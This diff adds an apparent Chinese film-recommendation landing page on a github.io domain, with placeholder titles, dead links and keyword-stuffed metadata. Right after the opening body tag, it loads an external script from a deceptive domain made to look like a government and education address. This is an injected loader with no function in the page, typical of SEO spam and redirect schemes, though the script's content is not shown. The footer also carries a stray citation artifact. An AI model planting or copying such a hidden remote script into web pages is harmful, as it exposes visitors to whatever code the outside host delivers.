@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇米影视 第四啬 - 影视推荐与资讯导航</title>
+<meta name="description" content="奇米影视 第四啬(qimiyingshidisise-h5.github.io)提供电影推荐、热播剧集盘点、综艺资讯与观影指南，移动端自适应，纯净影视导航单页。">
+<meta name="keywords" content="奇米影视 第四啬, qimiyingshidisise, 影视推荐, 电影榜单, 剧集资讯">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: "PingFang SC", "Microsoft YaHei", sans-serif; background: #0c0f0d; color: #e8e8e0; line-height: 1.65; overflow-x: hidden; }
+a { text-decoration: none; color: inherit; }
+img { max-width: 100%; }
+
+/* 顶部标签导航 */
+.topbar { background: #11160f; border-bottom: 1px solid #2a3326; position: sticky; top: 0; z-index: 50; }
+.topbar-in { max-width: 1180px; margin: auto; padding: .8rem 1.2rem; display: flex; align-items: center; gap: 1rem; flex-wrap: wrap; }
+.brand { font-size: 1.5rem; font-weight: 900; color: #d8b24a; white-space: nowrap; }
+.brand small { color: #7c8a72; font-weight: 400; font-size: .8rem; margin-left: .4rem; }
+.tags { display: flex; gap: .5rem; flex-wrap: wrap; margin-left: auto; }
+.tags a { font-size: .85rem; padding: .3rem .8rem; border: 1px solid #2a3326; border-radius: 20px; color: #aab59e; transition: .25s; }
+.tags a:hover { background: #d8b24a; color: #11160f; border-color: #d8b24a; }
+
+/* 首屏 */
+.hero { max-width: 1180px; margin: auto; padding: 3.5rem 1.2rem; display: grid; grid-template-columns: 1.3fr .9fr; gap: 2.5rem; align-items: center; }
+.hero h1 { font-size: 2.8rem; line-height: 1.2; color: #fff; margin-bottom: 1rem; }
+.hero h1 span { color: #d8b24a; }
+.hero p { color: #9aa68d; margin-bottom: 1.6rem; }
+.hero-cta { display: inline-block; background: #d8b24a; color: #11160f; padding: .7rem 2rem; border-radius: 30px; font-weight: 700; }
+.hero-cta:hover { opacity: .9; }
+.rank { background: #11160f; border: 1px solid #2a3326; border-radius: 14px; padding: 1.4rem 1.6rem; }
+.rank h3 { color: #d8b24a; font-size: 1.1rem; margin-bottom: 1rem; border-left: 4px solid #d8b24a; padding-left: .6rem; }
+.rank ol { list-style: none; counter-reset: r; }
+.rank li { counter-increment: r; display: flex; align-items: center; gap: .8rem; padding: .55rem 0; border-bottom: 1px dashed #232b1f; font-size: .95rem; }
+.rank li:last-child { border-bottom: none; }
+.rank li::before { content: counter(r); width: 22px; height: 22px; background: #2a3326; color: #d8b24a; border-radius: 6px; display: grid; place-items: center; font-size: .8rem; font-weight: 700; }
+.rank li b { color: #cfd6c4; font-weight: 500; }
+
+/* 区块标题 */
+.sec { max-width: 1180px; margin: auto; padding: 3rem 1.2rem; }
+.sec-head { display: flex; align-items: baseline; gap: 1rem; margin-bottom: 1.8rem; }
+.sec-head h2 { font-size: 1.6rem; color: #fff; }
+.sec-head span { color: #6f7c63; font-size: .85rem; }
+
+/* 电影横向轨道 */
+.track { display: flex; gap: 1.2rem; overflow-x: auto; padding-bottom: .6rem; scroll-snap-type: x mandatory; }
+.track::-webkit-scrollbar { height: 6px; }
+.track::-webkit-scrollbar-thumb { background: #2a3326; border-radius: 10px; }
+.film { flex: 0 0 240px; scroll-snap-align: start; background: #11160f; border: 1px solid #232b1f; border-radius: 12px; overflow: hidden; transition: .25s; }
+.film:hover { transform: translateY(-6px); border-color: #d8b24a; }
+.film .cv { height: 150px; background: linear-gradient(135deg,#1c241a,#0e120c); display: grid; place-items: center; color: #5d6a52; font-size: .85rem; }
+.film .info { padding: 1rem 1.1rem; }
+.film .info h4 { font-size: 1rem; color: #f0f0e8; margin-bottom: .3rem; }
+.film .info p { font-size: .8rem; color: #7c8a72; }
+
+/* 剧集时间轴 */
+.timeline { max-width: 820px; border-left: 2px solid #2a3326; padding-left: 1.4rem; }
+.tl-item { position: relative; padding: 0 0 1.8rem 0; }
+.tl-item::before { content: ""; position: absolute; left: -1.75rem; top: .35rem; width: 12px; height: 12px; background: #d8b24a; border-radius: 50%; box-shadow: 0 0 0 4px #11160f; }
+.tl-item h4 { color: #d8b24a; font-size: 1.1rem; margin-bottom: .4rem; }
+.tl-item p { color: #9aa68d; font-size: .92rem; margin-bottom: .5rem; }
+.tl-item a { color: #cfd6c4; font-size: .85rem; border-bottom: 1px solid #3a4633; }
+
+/* 资讯两栏 */
+.news-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.4rem; }
+.news { background: #11160f; border: 1px solid #232b1f; border-radius: 12px; padding: 1.3rem 1.5rem; transition: .25s; }
+.news:hover { border-color: #7c8a72; }
+.news .cat { font-size: .72rem; color: #11160f; background: #d8b24a; padding: .15rem .6rem; border-radius: 20px; display: inline-block; margin-bottom: .6rem; }
+.news h4 { font-size: 1.05rem; color: #fff; margin-bottom: .5rem; }
+.news p { font-size: .88rem; color: #8b977e; }
+
+/* 底部 */
+footer { background: #080a07; border-top: 1px solid #1c241a; padding: 2.4rem 1.2rem; text-align: center; color: #6f7c63; font-size: .85rem; }
+footer a { color: #d8b24a; }
+.disclaim { max-width: 760px; margin: .8rem auto 0; font-size: .78rem; color: #566045; line-height: 1.5; }
+
+@media (max-width: 860px) {
+  .hero { grid-template-columns: 1fr; }
+  .hero h1 { font-size: 2.1rem; }
+  .news-grid { grid-template-columns: 1fr; }
+  .tags { margin-left: 0; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="brand">奇米影视 第四啬<small>qimiyingshidisise</small></div>
+    <nav class="tags">
+      <a href="#">首页</a>
+      <a href="#">电影榜</a>
+      <a href="#">热播剧</a>
+      <a href="#">综艺资讯</a>
+      <a href="#">关于</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<section class="hero">
+  <div>
+    <h1>奇米影视 第四啬<br><span>影视推荐 · 观影导航</span></h1>
+    <p>奇米影视 第四啬（qimiyingshidisise-h5.github.io）整理每日值得看的电影、剧集与综艺资讯，移动端单页直达，不嵌套播放源，只做干净的内容导航。</p>
+    <a href="#" class="hero-cta">浏览今日推荐</a>
+  </div>
+  <aside class="rank">
+    <h3>本周热度榜</h3>
+    <ol>
+      <li><b>边境追凶</b> · 悬疑犯罪</li>
+      <li><b>暮色食堂</b> · 治愈日常</li>
+      <li><b>星轨之下</b> · 科幻冒险</li>
+      <li><b>长安旧梦</b> · 古装群像</li>
+      <li><b>周末发声</b> · 音乐综艺</li>
+    </ol>
+  </aside>
+</section>
+
+<!-- 电影推荐 -->
+<section class="sec">
+  <div class="sec-head"><h2>电影推荐</h2><span>FILM PICKS</span></div>
+  <div class="track">
+    <div class="film"><div class="cv">海报位</div><div class="info"><h4>边境追凶</h4><p>悬疑 / 犯罪 · 2026</p></div></div>
+    <div class="film"><div class="cv">海报位</div><div class="info"><h4>星轨之下</h4><p>科幻 / 冒险 · 2026</p></div></div>
+    <div class="film"><div class="cv">海报位</div><div class="info"><h4>暮色食堂</h4><p>剧情 / 治愈 · 2025</p></div></div>
+    <div class="film"><div class="cv">海报位</div><div class="info"><h4>极地信标</h4><p>动作 / 灾难题材</p></div></div>
+    <div class="film"><div class="cv">海报位</div><div class="info"><h4>纸上城市</h4><p>动画 / 家庭 · 2026</p></div></div>
+  </div>
+</section>
+
+<!-- 热播剧集 -->
+<section class="sec" style="background:#0a0d09;">
+  <div class="sec-head"><h2>热播剧集</h2><span>SERIES</span></div>
+  <div class="timeline">
+    <div class="tl-item">
+      <h4>长安旧梦 第二季</h4>
+      <p>权谋线与市井线并行，群像戏占比提升，适合喜欢慢热古装剧的观众。</p>
+      <a href="#">剧情简介 #</a>
+    </div>
+    <div class="tl-item">
+      <h4>深夜值班室</h4>
+      <p>单元剧形式，每集一个职场故事，台词扎实，节奏舒服。</p>
+      <a href="#">分集看点 #</a>
+    </div>
+    <div class="tl-item">
+      <h4>星轨之下 番外篇</h4>
+      <p>补充电影世界观，偏角色前传，科幻设定控可重点关注。</p>
+      <a href="#">观看顺序 #</a>
+    </div>
+  </div>
+</section>
+
+<!-- 综艺资讯 -->
+<section class="sec">
+  <div class="sec-head"><h2>综艺与资讯</h2><span>NEWS</span></div>
+  <div class="news-grid">
+    <div class="news"><span class="cat">综艺</span><h4>周末发声 第三期复盘</h4><p>本期权声编曲比重上升，现场乐队配置与选手曲风匹配度分析。</p></div>
+    <div class="news"><span class="cat">资讯</span><h4>十月新剧上线日历</h4><p>整理 10 月待播剧集档期，按平台与类型分类，方便追剧排期。</p></div>
+    <div class="news"><span class="cat">盘点</span><h4>悬疑片必备的 5 个结构</h4><p>从《边境追凶》聊到封闭空间叙事，单页摘要版。</p></div>
+    <div class="news"><span class="cat">指南</span><h4>移动端观影排版建议</h4><p>字体大小、暗色背景对比度、横向滑动卡片的适配要点。</p></div>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 奇米影视 第四啬 · qimiyingshidisise-h5.github.io</p>
+  <p>网址：<a href="https://qimiyingshidisise-h5.github.io">https://qimiyingshidisise-h5.github.io</a></p>
+  <p class="disclaim">本页为影视推荐与资讯导航示例，不提供未授权在线播放源、不聚合第三方资源、不存储视听文件。实际建站若涉及互联网视听节目传播，请按属地广电主管部门要求办理相应许可或备案。[16](@ref)</p>
+</footer>
+
+</body>
+</html>
